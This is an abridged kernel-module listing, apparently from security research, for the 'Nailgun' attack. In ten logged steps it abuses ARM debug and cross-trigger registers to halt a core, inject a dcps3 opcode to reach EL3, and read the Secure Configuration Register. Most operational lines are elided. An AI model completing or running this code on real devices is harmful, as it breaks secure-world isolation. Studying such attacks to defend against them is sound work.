...
static void read_scr(void *addr) {
    ...
    printk(KERN_ERR "Step 1: Unlock debug and cross trigger registers\n");
    ...
    printk(KERN_ERR "Step 2: Enable halting debug\n");
    ...
    printk(KERN_ERR "Step 3: Halt the target processor\n");
    ...
    printk(KERN_ERR "Step 4: Wait the target processor to halt\n");
    reg = ioread32(param->debug_register + EDSCR_OFFSET);
    ...
    printk(KERN_ERR "Step 5: Save context\n");
    // 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    ...
    printk(KERN_ERR "Step 6: Switch to EL3\n");
    // 0xf78f8003 <=> dcps3
    execute_ins_via_itr(param->debug_register, 0x8003f78f);

    // Step 7: Read the SCR
    printk(KERN_ERR "Step 7: Read SCR\n");
    ...
    printk(KERN_ERR "Step 8: Restore context\n");
    ...
    printk(KERN_ERR "Step 9: Send restart request to the target processor\n");
    reg = ioread32(param->cti_register + CTIGATE_OFFSET);
    reg &= ~GATE1;
    iowrite32(reg, param->cti_register + CTIGATE_OFFSET);
    ...
    printk(KERN_ERR "Step 10: Wait the target processor to restart\n");
    reg = ioread32(param->debug_register + EDSCR_OFFSET);
    ...
    printk(KERN_ERR "All done! The value of SCR is 0x%08x\n", scr);
}

static int __init nailgun_init(void) {
    printk(KERN_ERR "Nailgun Attack Start\n");
    ...
    printk(KERN_ERR "Using smp_call_function\n");
